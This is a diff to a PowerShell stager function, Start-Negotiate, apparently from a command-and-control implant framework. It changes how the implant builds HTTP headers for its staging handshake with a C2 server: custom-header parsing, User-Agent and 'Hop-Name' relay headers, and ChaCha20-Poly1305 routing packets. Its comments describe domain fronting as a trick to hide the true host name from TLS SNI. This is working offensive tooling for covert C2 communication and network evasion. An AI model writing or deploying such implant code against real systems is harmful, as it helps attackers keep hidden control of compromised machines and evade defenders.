@@ -1023,18 +1023,20 @@ function Start-Negotiate {
 
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
+        $headers = $customHeaders -split '<HEND>';
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
 	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
 	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
+            if ($headerKey -eq "host"){
                 try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
+            $wc.Headers.Set($headerKey, $headerValue);
         }
     }
-    $wc.Headers.Add("User-Agent",$UA);
+    if ($UA -ne $null -and $UA -ne "") {
+        $wc.Headers.Set("User-Agent",$UA)
+    }
 
     # session id (8 bytes ASCII)
     $ID='00000000'
@@ -1107,19 +1109,23 @@ function Start-Negotiate {
 
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
+        $headers = $customHeaders -split '<HEND>';
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host"){
                 try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
+            $wc.Headers.Set($headerKey, $headerValue);
         }
     }
-    $wc.Headers.Add("User-Agent",$UA);
-    $wc.Headers.Add("Hop-Name",$hop);
+    if ($UA -ne $null -and $UA -ne "") {
+        $wc.Headers.Set("User-Agent",$UA)
+    }
+    if ($hop -ne $null -and $hop -ne "") {
+        $wc.Headers.Set("Hop-Name",$hop)
+    }
 
     # stage_2: ChaCha20-Poly1305 routing with AES/HMAC(SessionKey) body
     $chachaPkt2 = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
